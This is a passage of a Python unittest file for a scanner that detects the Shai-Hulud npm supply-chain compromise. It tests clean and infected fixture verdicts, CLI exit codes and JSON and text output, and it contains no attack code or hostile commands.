        self.put(str((base / "package.json").relative_to(self.tmp)), '{"name": "svc", "version": "1.0.0"}')

    def test_repo_with_vendored_skill_is_clean(self):
        self.vendor(self.tmp)
        doc = scan(self.tmp)
        self.assertEqual(doc["verdict"], "clean", doc["findings"][:3])

    def test_host_with_vendored_skill_is_clean(self):
        home = self.tmp / "home"
        self.vendor(home / "work" / "svc")
        from shaihulud import host, findings
        found = host.scan_host([home], home, iocs.load(str(IOC_FILE)), iocs.load_allowlist())
        self.assertEqual(findings.verdict(found), "clean", found[:3])

    def test_marker_only_applies_below_root(self):
        self.assertEqual(scan(FIX / "infected-lockfile")["verdict"], "affected")

    def test_marker_outside_tests_fixtures_ignored(self):
        shutil.copytree(str(FIX / "infected-node-modules" / "node_modules"), str(self.tmp / "node_modules"))
        self.put("node_modules/@accordproject/.shai-hulud-test-fixtures", "attacker-planted\n")
        self.put("node_modules/@accordproject/concerto-linter/.shai-hulud-test-fixtures", "attacker-planted\n")
        self.assertEqual(scan(self.tmp)["verdict"], "affected")


class CliTests(TempDirCase):
    def test_exit_codes(self):
        expected = {"infected-lockfile": 2, "infected-node-modules": 2, "planted-workflow": 2, "clean": 0}
        for name, code in expected.items():
            r = run_cli("--repo", FIX / name)
            self.assertEqual(r.returncode, code, name + "\n" + r.stdout + r.stderr)

    def test_output_json_shape_and_text(self):
        out = self.tmp / "o" / "shai-hulud.json"
        r = run_cli("--repo", FIX / "infected-lockfile", "--output", out, "--format", "text")
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertIn("Verdict: AFFECTED", r.stdout)
        doc = json.loads(out.read_text())
        self.assertEqual(doc["verdict"], "affected")
        self.assertEqual(doc["mode"], "repo")

    def test_json_format_to_stdout(self):
        r = run_cli("--repo", FIX / "clean", "--format", "json")
        self.assertEqual(json.loads(r.stdout)["verdict"], "clean")

    def test_usage_errors_exit_3(self):
        self.assertEqual(run_cli().returncode, 3)
        self.assertEqual(run_cli("--repo", self.tmp / "missing").returncode, 3)
        bad = self.put("bad.json", "{}")
        self.assertEqual(run_cli("--repo", FIX / "clean", "--iocs", bad).returncode, 3)


if __name__ == "__main__":
    unittest.main()
